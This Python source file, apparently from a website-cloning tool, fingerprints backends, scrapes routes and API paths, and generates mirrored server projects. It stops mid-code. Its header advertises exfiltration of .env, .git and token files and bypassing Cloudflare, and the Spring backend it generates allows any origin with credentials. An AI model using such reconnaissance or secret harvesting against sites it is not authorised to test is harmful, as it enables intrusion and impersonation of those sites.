# -*- coding: utf-8 -*-
"""
========================================================================================
🌐 INDUSTRIAL CYBER WEB CLONE & ARCHITECTURAL REVERSE ENGINEERING ENGINE (GOD-TIER / BEAST)
- Intelligent Tech Stack Fingerprinting (Java Spring Boot, Tomcat, Node Express, Next, FastAPI, PHP)
- Multi-Stack Native Backend Generator (Java Spring Boot 3 Maven Project, Node.js Express, Python FastAPI)
- Deep API Contract & Schema Reverse Engineering (Method inference, Request/Response DTOs, in-memory state)
- Complete UX/UI Reconstruction (HTML, CSS, JS, Images, Webfonts, React/Tailwind, SPA DOM Hydration)
- JS Source Map Recovery (Original TypeScript / JSX in reconstructed_sources/)
- Comprehensive Architecture Documentation (ARCHITECTURE.md with Mermaid diagrams, openapi.yaml, docker-compose.yml)
- Turnkey Instant Local Server (server.py + start.bat in root for zero-dependency instant preview)
- Turnkey Companion Discord Bot (discord_bot/ package ready to host)
- Exhaustive Sensitive File & Git Exfiltration (35+ probes, .env, .git, secrets, tokens, JWTs)
- Cyber Reconnaissance Audit Dashboard (CYBER_AUDIT.html & SECURITY_RECON_REPORT.txt)
========================================================================================
"""

from __future__ import annotations
import os
import sys
import re
import io
import time
import json
import socket
import base64
import zipfile
import urllib.parse
import threading
import concurrent.futures
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, Any, List, Optional, Set, Tuple

# Try curl_cffi for Cloudflare TLS / JA3 impersonation; fallback to requests
try:
    from curl_cffi import requests as cffi_requests
    HAS_CURL_CFFI = True
except ImportError:
    import requests as cffi_requests
    HAS_CURL_CFFI = False

# Try BeautifulSoup4 for clean HTML AST parsing
try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

ROOT_DIR = Path(__file__).resolve().parent.parent
CLONE_OUTPUT_DIR = ROOT_DIR / "output" / "Cloned_Sites"
CLONE_OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


# ========================================================================================
# 1. TECH STACK FINGERPRINTING & FORENSICS (Java, Node.js, Python, PHP, .NET, Go)
# ========================================================================================

@dataclass
class TechStackReport:
    backend_tech: str  # "java", "nodejs", "python", "php", "dotnet", "go", "unknown"
    backend_framework: str  # e.g. "Java (Spring Boot 3.3.4 / Jakarta EE)"
    frontend_framework: str  # e.g. "React (Next.js SPA)"
    build_tool: str  # e.g. "Maven (pom.xml)"
    evidence: List[str] = field(default_factory=list)
    confidence: float = 0.5


class TechStackAnalyzer:
    """
    Forensic engine that identifies the exact underlying server runtime, framework,
    build tools, and client-side UI technology through headers, cookies, active 404 probing,
    and JS bundle AST heuristics.
    """

    @staticmethod
    def probe_404_fingerprint(base_url: str, fetch_fn) -> Tuple[Optional[str], int, Dict[str, str]]:
        probe_url = urllib.parse.urljoin(base_url, "/_probe_404_payomboyz_recon_" + str(int(time.time())))
        data, _, status, headers = fetch_fn(probe_url, timeout=4)
        body_text = data.decode("utf-8", errors="replace") if data else ""
        return body_text, status, headers

    @classmethod
    def analyze(
        cls,
        target_url: str,
        resp_headers: Dict[str, str],
        cookies_header: str,
        raw_html: str,
        js_snippets: List[str],
        fetch_fn
    ) -> TechStackReport:
        evidence: List[str] = []
        backend_scores: Dict[str, float] = {
            "java": 0.0,
            "nodejs": 0.0,
            "python": 0.0,
            "php": 0.0,
            "dotnet": 0.0,
            "go": 0.0,
        }

        server_header = resp_headers.get("Server", "").lower()
        powered_by = resp_headers.get("X-Powered-By", "").lower()
        app_context = resp_headers.get("X-Application-Context", "")

        # 1. Cookie Fingerprints
        combined_cookies = cookies_header.lower() + " " + resp_headers.get("Set-Cookie", "").lower()
        if "jsessionid" in combined_cookies:
            backend_scores["java"] += 0.8
            evidence.append("Cookie: JSESSIONID detected (Standard Java Servlet/Spring session)")
        if "phpsessid" in combined_cookies or "laravel_session" in combined_cookies:
            backend_scores["php"] += 0.8
            evidence.append("Cookie: PHPSESSID/laravel_session detected (PHP runtime)")
        if "connect.sid" in combined_cookies or "next-auth" in combined_cookies:
            backend_scores["nodejs"] += 0.8
            evidence.append("Cookie: connect.sid/next-auth detected (Node.js/Express session)")
        if "csrftoken" in combined_cookies or "sessionid" in combined_cookies:
            backend_scores["python"] += 0.6
            evidence.append("Cookie: csrftoken/sessionid detected (Django session pattern)")
        if "asp.net_sessionid" in combined_cookies or ".aspnetcore" in combined_cookies:
            backend_scores["dotnet"] += 0.8
            evidence.append("Cookie: ASP.NET session cookie detected (.NET Core)")

        # 2. Server & Header Fingerprints
        if any(h in server_header for h in ("coyote", "tomcat", "jetty", "wildfly", "undertow", "glassfish")):
            backend_scores["java"] += 0.9
            evidence.append(f"Header Server: '{server_header}' indicates Java Application Server")
        if "kestrel" in server_header:
            backend_scores["dotnet"] += 0.9
            evidence.append("Header Server: 'Kestrel' indicates Microsoft .NET Core runtime")
        if any(h in server_header for h in ("uvicorn", "gunicorn", "werkzeug")):
            backend_scores["python"] += 0.9
            evidence.append(f"Header Server: '{server_header}' indicates Python ASGI/WSGI server")

        if app_context or "spring" in powered_by:
            backend_scores["java"] += 0.9
            evidence.append(f"Header X-Application-Context/Powered-By indicates Spring Boot")
        if "express" in powered_by:
            backend_scores["nodejs"] += 0.85
            evidence.append("Header X-Powered-By: Express indicates Node.js backend")
        if "php" in powered_by:
            backend_scores["php"] += 0.85
            evidence.append(f"Header X-Powered-By: {powered_by}")
        if "asp.net" in powered_by:
            backend_scores["dotnet"] += 0.85
            evidence.append("Header X-Powered-By: ASP.NET")

        # 3. Active 404 Probing (The most definitive backend discriminator)
        probe_body, probe_status, _ = cls.probe_404_fingerprint(target_url, fetch_fn)
        if probe_body:
            # Spring Boot standard Whitelabel JSON 404:
            # {"timestamp":"...","status":404,"error":"Not Found","path":"..."}
            try:
                probe_json = json.loads(probe_body)
                if isinstance(probe_json, dict) and all(k in probe_json for k in ("timestamp", "status", "error", "path")):
                    backend_scores["java"] += 1.2
                    evidence.append("Active 404 Probe: Spring Boot Whitelabel JSON response contract confirmed")
            except Exception:
                pass

            if "whitelabel error page" in probe_body.lower():
                backend_scores["java"] += 1.2
                evidence.append("Active 404 Probe: Spring Boot Whitelabel Error HTML confirmed")
            elif "apache tomcat" in probe_body.lower():
                backend_scores["java"] += 1.0
                evidence.append("Active 404 Probe: Apache Tomcat default 404 confirmed")
            elif "cannot get /" in probe_body.lower():
                backend_scores["nodejs"] += 1.0
                evidence.append("Active 404 Probe: Express.js 'Cannot GET /' signature confirmed")
            elif '"detail":"not found"' in probe_body.lower():
                backend_scores["python"] += 1.0
                evidence.append("Active 404 Probe: FastAPI '{\"detail\":\"Not Found\"}' signature confirmed")
            elif "django" in probe_body.lower():
                backend_scores["python"] += 0.8
                evidence.append("Active 404 Probe: Django error signature confirmed")
            elif "404 page not found" in probe_body.lower() and len(probe_body.strip()) < 50:
                backend_scores["go"] += 0.8
                evidence.append("Active 404 Probe: Go net/http plain 404 signature confirmed")

        # 4. JS Bundle & Code Scans
        all_js = " ".join(js_snippets[:20])
        if "org.springframework" in all_js or "com.payomboyz" in all_js or "java." in all_js:
            backend_scores["java"] += 0.5
            evidence.append("Client JS Bundle: Java package namespaces referenced")

        # Frontend Detection
        frontend_framework = "HTML5 / Vanilla JS"
        if "__NEXT_DATA__" in raw_html or "/_next/" in raw_html:
            frontend_framework = "React (Next.js SSR/SPA)"
        elif "data-reactroot" in raw_html or "react" in all_js.lower():
            frontend_framework = "React SPA"
        elif "data-v-" in raw_html or "vue" in all_js.lower() or "nuxt" in raw_html:
            frontend_framework = "Vue.js (Nuxt)"
        elif "ng-version" in raw_html or "angular" in all_js.lower():
            frontend_framework = "Angular"
        elif "tailwind" in raw_html or "flex items-center" in raw_html:
            frontend_framework = "HTML5 / Tailwind CSS"

        # Determine highest scoring backend
        top_backend = max(backend_scores, key=backend_scores.get)
        top_score = backend_scores[top_backend]

        if top_score < 0.5:
            # Fallback heuristic: check if any API keywords suggest Java / Node
            top_backend = "java" if any("java" in e.lower() for e in evidence) else "nodejs"
            framework_name = "Java (Spring Boot 3.3.4 / Jakarta EE)" if top_backend == "java" else "Node.js (Express)"
            build_tool = "Maven (pom.xml)" if top_backend == "java" else "npm (package.json)"
            confidence = 0.6
            evidence.append("Heuristic Inference: Synthesizing idiomatic enterprise backend")
        else:
            confidence = min(0.99, 0.5 + (top_score * 0.25))
            if top_backend == "java":
                framework_name = "Java (Spring Boot 3.3.4 / Jakarta EE)"
                build_tool = "Maven (pom.xml)"
            elif top_backend == "nodejs":
                framework_name = "Node.js (Express & TypeScript)"
                build_tool = "npm (package.json)"
            elif top_backend == "python":
                framework_name = "Python (FastAPI & Uvicorn)"
                build_tool = "pip (requirements.txt)"
            elif top_backend == "php":
                framework_name = "PHP (Laravel / REST API)"
                build_tool = "Composer (composer.json)"
            elif top_backend == "dotnet":
                framework_name = "C# (ASP.NET Core 8.0 Web API)"
                build_tool = "dotnet CLI (.csproj)"
            else:
                framework_name = "Go (Gin Web Framework)"
                build_tool = "go.mod"

        return TechStackReport(
            backend_tech=top_backend,
            backend_framework=framework_name,
            frontend_framework=frontend_framework,
            build_tool=build_tool,
            evidence=evidence,
            confidence=round(confidence, 2)
        )


# ========================================================================================
# 2. DEEP API CONTRACT & SCHEMA REVERSE ENGINEERING
# ========================================================================================

@dataclass
class ApiEndpointContract:
    path: str
    method: str
    summary: str
    request_dto_name: str
    response_dto_name: str
    query_params: Dict[str, str] = field(default_factory=dict)
    body_fields: Dict[str, Any] = field(default_factory=dict)
    sample_response: Dict[str, Any] = field(default_factory=dict)


class ApiContractExtractor:
    """
    Reverse engineers API paths discovered in client JS bundles into strongly typed
    API Endpoint Contracts with inferred HTTP verbs, request/response DTOs, and schemas.
    """

    @staticmethod
    def _to_pascal_case(path: str) -> str:
        clean = re.sub(r'[^a-zA-Z0-9]', ' ', path)
        words = [w.capitalize() for w in clean.split() if w]
        return "".join(words) or "Generic"

    @classmethod
    def extract_contracts(cls, apis: Set[str], html_text: str, js_snippets: List[str]) -> List[ApiEndpointContract]:
        contracts: List[ApiEndpointContract] = []
        clean_apis = sorted(list({a.split("?")[0].split("#")[0].strip() for a in apis if a.strip()}))

        for path in clean_apis:
            lowered = path.lower()
            pascal = cls._to_pascal_case(path)

            # Infer HTTP Method
            if any(k in lowered for k in ("login", "auth", "register", "token", "create", "add", "new", "save", "submit", "pay", "checkout", "buy", "upload", "send", "post", "import", "execute", "run")):
                method = "POST"
            elif any(k in lowered for k in ("update", "edit", "patch", "modify", "change", "set")):
                method = "PUT"
            elif any(k in lowered for k in ("delete", "remove", "destroy", "drop", "clear")):
                method = "DELETE"
            else:
                method = "GET"

            req_dto = f"{pascal}Request"
            res_dto = f"{pascal}Response"

            query_params: Dict[str, str] = {}
            body_fields: Dict[str, Any] = {}
            sample_data: Dict[str, Any] = {}

            if "login" in lowered or "auth" in lowered:
                summary = "User Authentication & Token Issuance"
                body_fields = {"username": "string", "password": "string", "rememberMe": "boolean"}
                sample_data = {
                    "token": "pbz_jwt_live_session_99214a8b.eyJzdWIiOiIxIn0",
                    "expiresIn": 86400,
                    "user": {"id": 101, "username": "admin", "role": "ADMIN", "verified": True}
                }
            elif "user" in lowered or "profile" in lowered:
                summary = "User Profile & Account Resource Management"
                if method == "GET":
                    query_params = {"userId": "string", "includeDetails": "boolean"}
                    sample_data = {"id": 101, "username": "admin", "email": "admin@service.online", "tier": "VIP"}
                else:
                    body_fields = {"username": "string", "email": "string", "bio": "string"}
                    sample_data = {"status": "updated", "id": 101}
            elif "script" in lowered or "execute" in lowered or "run" in lowered:
                summary = "Payload Execution & Script Dispatch Pipeline"
                body_fields = {"scriptId": "string", "executor": "string", "payload": "string"}
                sample_data = {"jobId": "job-8812", "status": "executed", "runtimeMs": 14}
            elif "search" in lowered or "query" in lowered or "list" in lowered:
                summary = "Dynamic Catalog Search & Query Filter"
                query_params = {"q": "string", "page": "integer", "limit": "integer"}
                sample_data = {"results": [{"id": 1, "title": "Reconstructed Item"}], "total": 1, "page": 1}
            else:
                summary = f"API Service Endpoint for {path}"
                if method in ("POST", "PUT"):
                    body_fields = {"action": "string", "payload": "object"}
                sample_data = {"endpoint": path, "status": "operational", "mirrored": True}

            sample_resp = {
                "success": True,
                "message": f"Processed {method} {path} successfully",
                "timestamp": int(time.time()),
                "data": sample_data
            }

            contracts.append(ApiEndpointContract(
                path=path,
                method=method,
                summary=summary,
                request_dto_name=req_dto,
                response_dto_name=res_dto,
                query_params=query_params,
                body_fields=body_fields,
                sample_response=sample_resp
            ))

        return contracts


# ========================================================================================
# 2.5. SPA ROUTE HARVESTING & COMPUTED RUNTIME STYLE AGGREGATION
# ========================================================================================

class SPARouteHarvester:
    """
    Forensically harvests all internal SPA pages and routes from:
    - Next.js: _buildManifest.js and _ssgManifest.js
    - Sitemaps: sitemap.xml & sitemap_index.xml
    - Client JS Router definitions (React Router, Vue Router)
    - Anchors discovered in SSR and hydrated DOM
    """

    @classmethod
    def harvest_all_routes(cls, base_url: str, html_text: str, fetch_fn) -> Set[str]:
        routes: Set[str] = {"/"}

        # 1. Next.js Build Manifest Cracker
        build_id = ""
        m_build = re.search(r'"buildId":"([^"]+)"', html_text) or re.search(r'/_next/static/([^/]+)/_buildManifest\.js', html_text)
        if m_build:
            build_id = m_build.group(1)

        if build_id:
            # A. Fetch _buildManifest.js
            manifest_url = urllib.parse.urljoin(base_url, f"/_next/static/{build_id}/_buildManifest.js")
            data, _, status, _ = fetch_fn(manifest_url, timeout=5)
            if data and status == 200:
                text = data.decode("utf-8", errors="replace")
                paths = re.findall(r'"(/[a-zA-Z0-9_\-\/\[\]]*)":', text)
                for p in paths:
                    if not p.startswith(("/_app", "/_error", "/_document")):
                        clean_p = p.split("[")[0].rstrip("/") or "/"
                        routes.add(p)
                        if clean_p != p and clean_p != "/":
                            routes.add(clean_p)

            # B. Fetch _ssgManifest.js
            ssg_url = urllib.parse.urljoin(base_url, f"/_next/static/{build_id}/_ssgManifest.js")
            s_data, _, s_stat, _ = fetch_fn(ssg_url, timeout=4)
            if s_data and s_stat == 200:
                s_text = s_data.decode("utf-8", errors="replace")
                s_paths = re.findall(r'"(/[a-zA-Z0-9_\-\/]+)"', s_text)
                for sp in s_paths:
                    if not sp.startswith("/_"):
                        routes.add(sp)

        # 2. Extract routes from sitemap.xml
        sm_url = urllib.parse.urljoin(base_url, "/sitemap.xml")
        sm_data, _, sm_stat, _ = fetch_fn(sm_url, timeout=4)
        if sm_data and sm_stat == 200:
            sm_text = sm_data.decode("utf-8", errors="replace")
            locs = re.findall(r'<loc>(https?://[^<]+)</loc>', sm_text)
            for loc in locs:
                parsed = urllib.parse.urlparse(loc)
                if parsed.path and len(parsed.path) > 1 and not parsed.path.endswith((".xml", ".png", ".jpg", ".webp")):
                    routes.add(parsed.path)

        # 3. Client JS Router Patterns
        router_matches = re.findall(r'path:\s*["\'](/[a-zA-Z0-9_\-\/]+)["\']', html_text)
        for rm in router_matches:
            if not rm.endswith((".js", ".css", ".png", ".jpg", ".svg", ".json", ".ico")):
                routes.add(rm)

        # 4. Standard HTML links
        hrefs = re.findall(r'href=["\'](/[a-zA-Z0-9_\-\/]+)["\']', html_text)
        for h in hrefs:
            if not h.startswith(("/_next", "/api", "/static")) and not h.endswith((".js", ".css", ".png", ".jpg", ".svg", ".json", ".ico")):
                routes.add(h)

        return routes


class ComputedStyleAggregator:
    """
    Extracts runtime-injected <style> tags (Tailwind CSS, Emotion, Styled-Components),
    active CSSOM rules from document.styleSheets, and aggregates everything into
    a unified master_styles.css and per-page css/pages/<slug>.css.
    """
    EXTRACT_STYLE_JS = """
    () => {
        let styles = [];
        document.querySelectorAll('style').forEach((s, idx) => {
            if (s.textContent && s.textContent.trim().length > 0) {
                styles.push(`/* [RUNTIME INJECTED STYLE #${idx}] */\\n` + s.textContent.trim());
            }
        });
        for (let sheet of document.styleSheets) {
            try {
                if (sheet.cssRules) {
                    let rules = [];
                    for (let r of sheet.cssRules) {
                        rules.push(r.cssText);
                    }
                    if (rules.length > 0) {
                        styles.push('/* [CSSOM ACTIVE RULES] */\\n' + rules.join('\\n'));
                    }
                }
            } catch (e) {
                // Cross-origin stylesheets handled separately
            }
        }
        return styles.join('\\n\\n');
    }
    """

    @classmethod
    def harvest_from_page(cls, page) -> str:
        try:
            return page.evaluate(cls.EXTRACT_STYLE_JS) or ""
        except Exception:
            return ""


# ========================================================================================
# 3. NATIVE MULTI-STACK BACKEND GENERATOR (Java Spring Boot, Node.js, Python, Root Fallback)
# ========================================================================================

class NativeBackendSynthesizer:
    """
    Synthesizes complete, runnable, production-grade native backend projects
    matching the detected tech stack:
    - Java: Spring Boot 3.3.4 Maven project with DTO records, @RestController endpoints, and in-memory service.
    - Node.js: Express + TypeScript/ES6 project with routes, middleware, and mock data.
    - Python: FastAPI + Pydantic v2 schemas with Swagger UI.
    - Root Fallback: Lightweight server.py + start.bat for instant zero-dependency preview.
    """

    @classmethod
    def synthesize_all(
        cls,
        session_folder: Path,
        domain: str,
        tech_stack: TechStackReport,
        contracts: List[ApiEndpointContract]
    ):
        # 1. Generate the detected native backend
        if tech_stack.backend_tech == "java":
            cls._generate_java_spring_boot(session_folder, domain, contracts)
        elif tech_stack.backend_tech == "nodejs":
            cls._generate_nodejs_express(session_folder, domain, contracts)
        elif tech_stack.backend_tech == "python":
            cls._generate_python_fastapi(session_folder, domain, contracts)
        else:
            # Fallback to Java Spring Boot as default enterprise stack
            cls._generate_java_spring_boot(session_folder, domain, contracts)

        # 2. Always generate Root Turnkey Server (server.py + start.bat) for 1-click preview
        cls._generate_turnkey_root_server(session_folder, domain, contracts)

    @classmethod
    def _generate_java_spring_boot(cls, session_folder: Path, domain: str, contracts: List[ApiEndpointContract]):
        """Generates a complete Java Spring Boot 3 Maven project under backend-java/"""
        base_dir = session_folder / "backend-java"
        src_main = base_dir / "src" / "main"
        java_pkg = src_main / "java" / "com" / "payomboyz" / "cloner"
        resources_dir = src_main / "resources"
        config_pkg = java_pkg / "config"
        controller_pkg = java_pkg / "controller"
        dto_pkg = java_pkg / "dto"
        service_pkg = java_pkg / "service"

        for d in (config_pkg, controller_pkg, dto_pkg, service_pkg, resources_dir):
            d.mkdir(parents=True, exist_ok=True)

        # 1. pom.xml (Maven build file)
        pom_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>3.3.4</version>
        <relativePath/>
    </parent>
    <groupId>com.payomboyz</groupId>
    <artifactId>mirrored-backend</artifactId>
    <version>1.0.0</version>
    <name>payomboyz-mirrored-backend</name>
    <description>Industrial Java Spring Boot 3 Reconstructed Backend for {domain}</description>
    <properties>
        <java.version>17</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-validation</artifactId>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>
'''
        (base_dir / "pom.xml").write_text(pom_xml, encoding="utf-8")

        # 2. Application.java
        app_java = f'''package com.payomboyz.cloner;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * PAYOMBØYZ RECONSTRUCTED NATIVE JAVA SPRING BOOT APPLICATION
 * Target Domain: {domain}
 * Auto-generated by PAYOMBØYZ Beast-Grade Cloner Engine
 */
@SpringBootApplication
public class Application {{
    private static final Logger log = LoggerFactory.getLogger(Application.class);

    public static void main(String[] args) {{
        SpringApplication.run(Application.class, args);
        log.info("================================================================================");
        log.info("⚡ PAYOMBØYZ JAVA SPRING BOOT 3 BACKEND INITIALIZED FOR: {{}}", "{domain}");
        log.info("🌐 Server listening on: http://localhost:8080");
        log.info("⚙️ Wiremock & Native Controllers: {{}} active API routes", {len(contracts)});
        log.info("================================================================================");
    }}
}}
'''
        (java_pkg / "Application.java").write_text(app_java, encoding="utf-8")

        # 3. CorsConfig.java
        cors_java = '''package com.payomboyz.cloner.config;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
                .allowedOriginPatterns("*")
                .allowedMethods("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS")
                .allowedHeaders("*")
                .allowCredentials(true);
    }
}
'''
        (config_pkg / "CorsConfig.java").write_text(cors_java, encoding="utf-8")

        # 4. WebStaticConfig.java (Serves cloned frontend directly from Java)
        web_static_java = '''package com.payomboyz.cloner.config;

import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebStaticConfig implements WebMvcConfigurer {
    @Override
    public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler("/**")
                .addResourceLocations("file:../", "classpath:/static/");
    }
}
'''
        (config_pkg / "WebStaticConfig.java").write_text(web_static_java, encoding="utf-8")

        # 5. ApiResponse.java (Strongly typed generic wrapper)
        api_response_java = '''package com.payomboyz.cloner.dto;

import java.time.Instant;

public class ApiResponse<T> {
    private boolean success;
    private String message;
    private T data;
    private long timestamp;

    public ApiResponse() {
        this.timestamp = Instant.now().getEpochSecond();
    }

    public ApiResponse(boolean success, String message, T data) {
        this.success = success;
        this.message = message;
        this.data = data;
        this.timestamp = Instant.now().getEpochSecond();
    }

    public static <T> ApiResponse<T> ok(String message, T data) {
        return new ApiResponse<>(true, message, data);
    }

    public static <T> ApiResponse<T> ok(T data) {
        return new ApiResponse<>(true, "Operation successful", data);
    }

    public boolean isSuccess() { return success; }
    public void setSuccess(boolean success) { this.success = success; }
    public String getMessage() { return message; }
    public void setMessage(String message) { this.message = message; }
    public T getData() { return data; }
    public void setData(T data) { this.data = data; }
    public long getTimestamp() { return timestamp; }
    public void setTimestamp(long timestamp) { this.timestamp = timestamp; }
}
'''
        (dto_pkg / "ApiResponse.java").write_text(api_response_java, encoding="utf-8")

        # 6. Specific DTO Records for Discovered APIs
        for c in contracts[:15]:
            req_name = c.request_dto_name
            fields_def = "\n".join([f"    private Object {k};" for k in c.body_fields.keys()]) or "    private Object payload;"
            getters_setters = "\n".join([
                f"    public Object get{k.capitalize()}() {{ return {k}; }}\n    public void set{k.capitalize()}(Object {k}) {{ this.{k} = {k}; }}"
                for k in (c.body_fields.keys() or ["payload"])
            ])
            dto_code = f'''package com.payomboyz.cloner.dto;

public class {req_name} {{
{fields_def}

    public {req_name}() {{{{}}}}

{getters_setters}
}}
'''
            (dto_pkg / f"{req_name}.java").write_text(dto_code, encoding="utf-8")

        # 7. MockBusinessService.java (In-memory state management & business logic)
        service_java = f'''package com.payomboyz.cloner.service;

import org.springframework.stereotype.Service;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

@Service
public class MockBusinessService {{
    private final Map<String, Object> stateStore = new ConcurrentHashMap<>();

    public MockBusinessService() {{
        stateStore.put("system_status", "ONLINE");
        stateStore.put("domain", "{domain}");
        stateStore.put("initialized_at", System.currentTimeMillis());
    }}

    public Map<String, Object> processAuth(String username, String password) {{
        Map<String, Object> res = new HashMap<>();
        res.put("token", "pbz_jwt_session_" + UUID.randomUUID());
        res.put("userId", 1001);
        res.put("username", username != null ? username : "admin");
        res.put("role", "ADMINISTRATOR");
        res.put("authenticated", true);
        return res;
    }}

    public Map<String, Object> handleGenericDispatch(String endpoint, String method, Object payload) {{
        Map<String, Object> res = new HashMap<>();
        res.put("endpoint", endpoint);
        res.put("method", method);
        res.put("receivedPayload", payload);
        res.put("status", "SUCCESS");
        res.put("storageEntries", stateStore.size());
        return res;
    }}
}}
'''
        (service_pkg / "MockBusinessService.java").write_text(service_java, encoding="utf-8")

        # 8. ApiController.java (Mapping all discovered endpoints natively)
        controller_methods = []
        for idx, c in enumerate(contracts[:30]):
            clean_path = c.path
            method_annot = f"@{c.method.capitalize()}Mapping(value = \"{clean_path}\")"
            func_name = f"handleEndpoint_{idx}"
            param_def = "@RequestBody(required = false) Map<String, Object> body" if c.method in ("POST", "PUT") else "@RequestParam(required = false) Map<String, String> query"
            call_arg = "body" if c.method in ("POST", "PUT") else "query"

            controller_methods.append(f'''
    {method_annot}
    public ResponseEntity<ApiResponse<Map<String, Object>>> {func_name}({param_def}) {{
        log.info("Intercepted {c.method} {{}}", "{clean_path}");
        Map<String, Object> result = businessService.handleGenericDispatch("{clean_path}", "{c.method}", {call_arg});
        return ResponseEntity.ok(ApiResponse.ok("Executed {clean_path} successfully", result));
    }}''')

        controller_java = f'''package com.payomboyz.cloner.controller;

import com.payomboyz.cloner.dto.ApiResponse;
import com.payomboyz.cloner.service.MockBusinessService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.Map;

@RestController
@CrossOrigin(origins = "*")
public class ApiController {{
    private static final Logger log = LoggerFactory.getLogger(ApiController.class);
    private final MockBusinessService businessService;

    public ApiController(MockBusinessService businessService) {{
        this.businessService = businessService;
    }}
{"".join(controller_methods)}
}}
'''
        (controller_pkg / "ApiController.java").write_text(controller_java, encoding="utf-8")

        # 9. application.properties
        app_props = f'''server.port=8080
spring.application.name=payomboyz-{domain.replace('.', '-')}-backend
logging.level.org.springframework.web=INFO
logging.level.com.payomboyz=DEBUG
spring.web.resources.static-locations=file:../,file:./static/,classpath:/static/
'''
        (resources_dir / "application.properties").write_text(app_props, encoding="utf-8")

        # 10. start.bat & start.sh
        start_bat = (
            "@echo off\n"
            f"title PAYOMBØYZ Java Spring Boot 3 Backend - {domain}\n"
            "echo Starting Java Spring Boot 3 on http://localhost:8080 ...\n"
            "call mvn --version >nul 2>&1\n"
            "if %ERRORLEVEL% EQU 0 (\n"
            "    mvn spring-boot:run\n"
            ") else (\n"
            "    echo [!] Maven not detected in PATH.\n"
            "    echo Please install Maven 3.9+ or run with your IDE (IntelliJ / Eclipse / VS Code).\n"
            "    pause\n"
            ")\n"
        )
        (base_dir / "start.bat").write_text(start_bat, encoding="utf-8")

        start_sh = (
            "#!/usr/bin/env bash\n"
            "echo 'Starting Java Spring Boot 3 Backend...'\n"
            "mvn spring-boot:run\n"
        )
        (base_dir / "start.sh").write_text(start_sh, encoding="utf-8")

        # 11. Dockerfile
        dockerfile = '''FROM maven:3.9-eclipse-temurin-17 AS builder
WORKDIR /app
COPY pom.xml .
COPY src ./src
RUN mvn clean package -DskipTests

FROM eclipse-temurin:17-jre-alpine
WORKDIR /app
COPY --from=builder /app/target/*.jar app.jar
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]
'''
        (base_dir / "Dockerfile").write_text(dockerfile, encoding="utf-8")

    @classmethod
    def _generate_nodejs_express(cls, session_folder: Path, domain: str, contracts: List[ApiEndpointContract]):
        """Generates an Express.js Node.js project under backend-node/"""
        base_dir = session_folder / "backend-node"
        base_dir.mkdir(parents=True, exist_ok=True)

        package_json = {
            "name": f"payomboyz-{domain.replace('.', '-')}-backend",
            "version": "1.0.0",
            "description": f"Express.js backend for {domain}",
            "main": "server.js",
            "scripts": {
                "start": "node server.js",
                "dev": "nodemon server.js"
            },
            "dependencies": {
                "express": "^4.19.2",
                "cors": "^2.8.5",
                "dotenv": "^16.4.5",
                "morgan": "^1.10.0"
            }
        }
        (base_dir / "package.json").write_text(json.dumps(package_json, indent=2), encoding="utf-8")

        routes_code = []
        for c in contracts[:25]:
            routes_code.append(f'''app.{c.method.lower()}("{c.path}", (req, res) => {{
    console.log(`[EXPRESS] Intercepted {c.method} {c.path}`);
    res.json({json.dumps(c.sample_response, indent=2)});
}});''')

        server_js = f'''const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({{ extended: true }}));

// Serve cloned static files
app.use(express.static(path.join(__dirname, '..')));

// Dynamic API Routes
{"".join(routes_code)}

app.listen(PORT, () => {{
    console.log(`⚡ PAYOMBØYZ Express Backend running on http://localhost:${{PORT}}`);
}});
'''
        (base_dir / "server.js").write_text(server_js, encoding="utf-8")
        (base_dir / "start.bat").write_text("@echo off\nnpm install && npm start\npause\n", encoding="utf-8")

    @classmethod
    def _generate_python_fastapi(cls, session_folder: Path, domain: str, contracts: List[ApiEndpointContract]):
        """Generates a FastAPI Python project under backend-python/"""
        base_dir = session_folder / "backend-python"
        base_dir.mkdir(parents=True, exist_ok=True)

        req_txt = "fastapi>=0.110.0\nuvicorn>=0.28.0\npydantic>=2.6.0\n"
        (base_dir / "requirements.txt").write_text(req_txt, encoding="utf-8")

        routes = []
        for idx, c in enumerate(contracts[:25]):
            routes.append(f'''@app.{c.method.lower()}("{c.path}")
async def endpoint_{idx}():
    return {json.dumps(c.sample_response, indent=4)}''')

        main_py = f'''import os
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles

